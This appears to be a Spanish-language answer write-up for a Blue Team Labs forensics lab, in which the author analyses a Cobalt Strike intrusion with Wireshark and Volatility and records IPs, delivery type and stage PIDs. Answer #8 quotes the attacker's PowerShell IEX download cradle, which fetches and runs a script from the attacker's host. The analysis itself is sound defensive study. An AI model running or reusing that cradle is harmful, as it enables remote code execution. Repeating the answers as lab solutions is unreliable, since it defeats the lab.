- --
- Tags: #wireshark #volatility #btlo #multistages_lab
- --
#1) ¿Cuál es la dirección IP del atacante? (Formato X.X.X.X)
![Pasted image 20260626195812](../Fotos/Pasted%20image%2020260626195812.png)
192.168.100.97

#2) ¿Cuál es la dirección IP de la víctima? (Formato: X.X.X.X)
![Pasted image 20260626194906](../Fotos/Pasted%20image%2020260626194906.png)
192.168.100.100

#3) ¿Cómo se llama la herramienta/marco de ataque utilizada para atacar a la víctima? (Formato: Nombre de la herramienta)
![Pasted image 20260626203117](../Fotos/Pasted%20image%2020260626203117.png)
Cobalt Strike

#4) ¿Puedes identificar el tipo de baliza (protocolo utilizado) y el puerto? (Formato: Nombre:Port)
![Pasted image 20260626212016](../Fotos/Pasted%20image%2020260626212016.png)
![Pasted image 20260626212107](../Fotos/Pasted%20image%2020260626212107.png)
http 80

#5) ¿Puedes identificar el tipo de entrega? (Formato: X Entrega Web (X))
**¿Qué significa?** El atacante usó un **script de PowerShell** para descargar y ejecutar un componente en la memoria
Scripted Web Delivery (S)

#6) ¿Puede identificar el tipo de carga? (Formato: Tipo de carga)
Ese comando indica que el payload entregado al equipo es un **script de PowerShell**.
![Pasted image 20260626233341](../Fotos/Pasted%20image%2020260626233341.png)
Powershell

#7) ¿Puedes identificar la URL maliciosa? (Formato: http://domain.tld/path)
![Pasted image 20260626201727](../Fotos/Pasted%20image%2020260626201727.png)
![Pasted image 20260626201709](../Fotos/Pasted%20image%2020260626201709.png)
http://192.168.100.97:80/WindowsUpdateService

#8) ¿Cuál es el comando Malicious PowerShell para descargar el archivo desde la URL de la pregunta anterior? (Formato: Cadena de comando)
![Pasted image 20260626201912](../Fotos/Pasted%20image%2020260626201912.png)
"IEX ((new-object net.webclient).downloadstring('http://192.168.100.97:80/WindowsUpdateService'))"

---
![Pasted image 20260627094615](../Fotos/Pasted%20image%2020260627094615.png)
![Pasted image 20260627095111](../Fotos/Pasted%20image%2020260627095111.png)

---
#9) Proporcionar el ID del proceso de la Etapa 1 (formato: PID)
![Pasted image 20260626201949](../Fotos/Pasted%20image%2020260626201949.png)
3976

#10) Proporcionar el ID del proceso de la etapa 2 (formato: PID)
![Pasted image 20260626233832](../Fotos/Pasted%20image%2020260626233832.png)
2584

#11) Proporcionar el ID del proceso de la etapa 3 (formato: PID)
![Pasted image 20260627100707](../Fotos/Pasted%20image%2020260627100707.png)
1764

#12) Proporcionar el ID del proceso de la Etapa 4 (formato: PID)
![Pasted image 20260627100746](../Fotos/Pasted%20image%2020260627100746.png)
208

#13) ¿Cuál es el ID único de la máquina de víctimas? (Formato: XXXXXXXXXX)
![Pasted image 20260627095553](../Fotos/Pasted%20image%2020260627095553.png)
1118316996

```powershell
explorer.exe (1564)
  └─ powershell.exe (3976)     [Stage 1 — IEX download cradle]
       └─ rundll32.exe (2584)  [Stage 2 — reflective DLL injection]
vmtoolsd.exe (1764)            [Stage 3 — injected beacon host]
rundll32.exe (208)             [Stage 4 — active C2 beacon]
```